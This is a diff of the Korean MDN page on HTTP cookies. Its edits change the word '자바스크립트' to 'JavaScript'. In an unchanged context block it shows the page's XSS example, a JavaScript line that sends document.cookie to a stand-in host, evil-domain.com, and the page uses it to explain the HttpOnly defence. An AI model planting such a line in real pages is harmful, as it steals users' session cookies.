@@ -103,9 +103,9 @@ Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
 
 `SameSite` 쿠키는 쿠키가 cross-site 요청과 함께 전송되지 않았음을 요구하게 만들어, cross-site 요청 위조 공격({{Glossary("CSRF")}})에 대해 어떤 보호 방법을 제공합니다. `SameSite` 쿠키는 여전히 실험 중이며 모든 브라우저에 의해 아직 제공되지 않고 있습니다.
 
-### `Document.cookie`를 사용한 자바스크립트 접근
+### `Document.cookie`를 사용한 JavaScript 접근
 
-새로운 쿠키들은 {{domxref("Document.cookie")}}를 사용해 만들어질 수도 있으며, `HttpOnly` 플래그가 설정되지 않은 경우 기본의 쿠키들은 자바스크립트로부터 잘 접근될 수 있습니다.
+새로운 쿠키들은 {{domxref("Document.cookie")}}를 사용해 만들어질 수도 있으며, `HttpOnly` 플래그가 설정되지 않은 경우 기본의 쿠키들은 JavaScript로부터 잘 접근될 수 있습니다.
 
 ```js
 document.cookie = "yummy_cookie=choco";
@@ -114,7 +114,7 @@ console.log(document.cookie);
 // logs "yummy_cookie=choco; tasty_cookie=strawberry"
 ```
 
-아래 [보안](/ko/docs/Web/HTTP/Cookies#Security) 섹션에서 다루고 있는데로 보안 관련 내용들을 잘 알아두시기 바랍니다. 자바스크립트에서 이용 가능한 쿠키들은 XSS를 통해 감청될 수 있습니다.
+아래 [보안](/ko/docs/Web/HTTP/Cookies#Security) 섹션에서 다루고 있는데로 보안 관련 내용들을 잘 알아두시기 바랍니다. JavaScript에서 이용 가능한 쿠키들은 XSS를 통해 감청될 수 있습니다.
 
 ## 보안
 
@@ -129,7 +129,7 @@ new Image().src =
   "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
-`HttpOnly` 쿠키 속성은 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있습니다.
+`HttpOnly` 쿠키 속성은 JavaScript를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있습니다.
 
 ### Cross-site 요청 위조 (CSRF)
 
